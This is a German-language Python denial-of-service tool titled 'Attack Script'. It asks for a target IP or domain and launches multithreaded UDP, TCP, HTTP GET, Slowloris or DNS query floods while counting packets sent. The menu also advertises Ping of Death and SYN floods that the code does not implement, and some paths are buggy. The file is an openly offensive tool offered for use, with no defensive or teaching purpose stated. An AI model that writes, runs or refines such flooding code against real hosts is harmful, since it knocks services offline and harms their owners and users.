import os
import random
import socket
import requests
import threading
import time

# Globale Variablen
packet_counter = 0  # Zähler für gesendete Pakete
stop_event = threading.Event()  # Ereignis zum Stoppen der Angriffe

# Funktion zum Setzen der Farben
def print_colored(text, color="pink", background="black"):
    color_codes = {
        "pink": "\033[38;5;13m",
        "red": "\033[38;5;9m",
        "blue": "\033[38;5;12m",
        "green": "\033[38;5;10m",
        "yellow": "\033[38;5;11m",
        "white": "\033[38;5;15m",
        "reset": "\033[0m"
    }
    background_codes = {
        "black": "\033[48;5;0m",
        "white": "\033[48;5;15m",
        "blue": "\033[48;5;19m",
        "red": "\033[48;5;1m",
        "reset": "\033[0m"
    }
    print(f"{background_codes[background]}{color_codes[color]}{text}{color_codes['reset']}{background_codes['reset']}")

# Funktion für Threads
def thread_attack(func, *args):
    thread = threading.Thread(target=func, args=args)
    thread.daemon = True
    thread.start()

# Funktion zum Anzeigen des Zählers
def show_statistics():
    while not stop_event.is_set():
        print_colored(f"Gesendete Pakete: {packet_counter}", color="green", background="black")
        time.sleep(1)  # Aktualisierung alle 1 Sekunde

# Angriffsfunktionen
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        sock.sendto(udp_bytes, (ip, port))
        packet_counter += 1

def tcp_flood(ip, port, packet_size):
    global packet_counter
    while not stop_event.is_set():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, port))
            sock.send(random._urandom(packet_size))
            packet_counter += 1
        except:
            pass
        finally:
            sock.close()

def http_get_flood(target):
    global packet_counter
    while not stop_event.is_set():
        try:
            requests.get(target)
            packet_counter += 1
        except:
            pass

def slowloris(ip, port, num_threads):
    global packet_counter
    sockets = []
    for _ in range(num_threads):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sockets.append(sock)
        except:
            pass
    while not stop_event.is_set():
        for sock in sockets:
            try:
                sock.send(b"X-a: Keep-alive\r\n")
                packet_counter += 1
            except:
                pass

def dns_flood(ip):
    global packet_counter
    server = (ip, 53)
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    while not stop_event.is_set():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(query, server)
        packet_counter += 1

# Hauptprogramm
if __name__ == "__main__":
    os.system("clear")
    os.system("figlet -f slant Attack Script")

    # Farben auswählen
    print_colored("Farbauswahl für Schrift und Hintergrund:", color="pink")
    print("1 - Pink (Standard), 2 - Rot, 3 - Blau, 4 - Grün, 5 - Gelb")
    color_choice = int(input("Wähle eine Schriftfarbe: "))
    bg_choice = int(input("Wähle eine Hintergrundfarbe (1-Schwarz, 2-Weiß, 3-Blau, 4-Rot): "))

    colors = ["pink", "red", "blue", "green", "yellow"]
    backgrounds = ["black", "white", "blue", "red"]
    color = colors[color_choice - 1] if color_choice in range(1, 6) else "pink"
    background = backgrounds[bg_choice - 1] if bg_choice in range(1, 5) else "black"

    # Angriffsoptionen anzeigen
    print_colored("Willkommen zum Angriffsskript!", color=color, background=background)
    print_colored("Bitte wählen Sie eine Angriffsmethode:", color=color, background=background)
    print("1 - UDP Flood\n2 - TCP Flood\n3 - POD Flood (Ping of Death)\n4 - SYN Flood")
    print("5 - HTTP GET Flood (rootfrei)\n6 - Slowloris Attack (rootfrei)\n7 - DNS Query Flood (rootfrei)")
    
    # Benutzereingaben
    method = input("Wähle die Angriffsmethode (1-7): ")
    ip = input("Ziel-IP-Adresse (oder Domain): ")
    num_threads = int(input("Gib die Anzahl der Threads ein (z. B. 1000): "))
    packet_size = None

    if method in ["1", "2"]:
        port = int(input("Port (z. B. 80): "))
        packet_size = int(input("Paketgröße in Bytes (z. B. 1024): "))

    # Zähler starten
    stats_thread = threading.Thread(target=show_statistics)
    stats_thread.daemon = True
    stats_thread.start()

    # Angriffsstart
    try:
        if method == "1":  # UDP Flood
            print_colored("Starte UDP-Flood...", color=color, background=background)
            for _ in range(num_threads):
                thread_attack(udp_flood, ip, port, packet_size)

        elif method == "2":  # TCP Flood
            print_colored("Starte TCP-Flood...", color=color, background=background)
            for _ in range(num_threads):
                thread_attack(tcp_flood, ip, port, packet_size)

        elif method == "5":  # HTTP GET Flood
            print_colored("Starte HTTP GET Flood...", color=color, background=background)
            target_url = f"http://{ip}"
            for _ in range(num_threads):
                thread_attack(http_get_flood, target_url)

        elif method == "6":  # Slowloris
            print_colored("Starte Slowloris...", color=color, background=background)
            for _ in range(num_threads):
                thread_attack(slowloris, ip, port, num_threads)

        elif method == "7":  # DNS Query Flood
            print_colored("Starte DNS Query Flood...", color=color, background=background)
            for _ in range(num_threads):
                thread_attack(dns_flood, ip)

        else:
            print_colored("Ungültige Auswahl. Das Programm wird beendet.", color="red", background="black")

    except KeyboardInterrupt:
        print_colored("\nAngriff gestoppt! Statistiken werden geschlossen.", color="yellow", background="black")
        stop_event.set()
